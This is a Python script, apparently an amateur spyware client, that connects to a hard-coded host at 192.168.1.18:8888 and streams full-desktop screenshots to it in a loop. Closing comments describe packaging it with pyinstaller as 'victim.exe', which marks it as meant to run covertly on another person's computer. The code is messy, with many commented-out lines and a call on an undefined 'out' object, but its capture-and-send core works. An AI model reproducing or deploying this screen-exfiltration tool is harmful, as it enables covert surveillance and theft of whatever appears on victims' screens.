# importing the required packages
import pyautogui
import cv2
import numpy as np
from win32api import GetSystemMetrics 
import socket
import pickle
import imutils
from PIL import ImageGrab
import struct


  

#create socket 
s = socket.socket()
s.connect(('192.168.1.18',8888))

img_counter =0
encode_param=[int(cv2.IMWRITE_JPEG_QUALITY),90]
width = GetSystemMetrics(0)
height = GetSystemMetrics(1)

s.send(width.to_bytes(2, 'big'))
s.send(height.to_bytes(2, 'big'))

#get desktop  bixels
#pixels = im.getpixel((10, 10))
  
  
  
  
while True:
    # Take screenshot using PyAutoGUI
    img = ImageGrab.grab(bbox=None) #x, y, w, h
    #img = pyautogui.screenshot()
   
    frame = np.array(img)
    
    res , image = cv2.imencode('.jpg', frame, encode_param)
    data = pickle.dumps(image, 0)
    size = len(data)
    #print(data)
    
    #print(ret)
    # 鏡像
   
    #result, image = cv2.imencode('.jpg', frame, encode_param)
  
    #print(data)
    #print(img_np)
    #res = pickle.dumps(img_np)
    #############frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2GRAY)
    
    #print(frame)
    
    
    #frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2GRAY)
    #frame = cv2.cvtColor(img_np, cv2.COLOR_BGR2RGB)
   
    
    
    if img_counter%10==0:
        s.sendall(struct.pack(">L", size) + data)
        
        
        
  
    # Convert the screenshot to a numpy array
    ###frame = np.array(img)
    #print(frame)
    ###frame_bytes = frame.tobytes()
    ###s.sendall(frame_bytes)
  
    # Convert it from BGR(Blue, Green, Red) to
    # RGB(Red, Green, Blue)
    ###frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    
    
    img_counter += 1
  
    # Write it to the output file
    ###out.write(frame)
      
    # Optional: Display the recording screen
    #cv2.imshow('Live', frame)
      
    # Stop recording when we press 'q'
    if cv2.waitKey(1) == ord('q'):
        break
  
# Release the Video writer
out.release()
  
# Destroy all windows
cv2.destroyAllWindows()




#pyinstaller
#C:\Users\mohamed_adel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\Scripts

#victim.exe
#C:\Users\mohamed_adel\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.10_qbz5n2kfra8p0\LocalCache\local-packages\Python310\Scripts\dist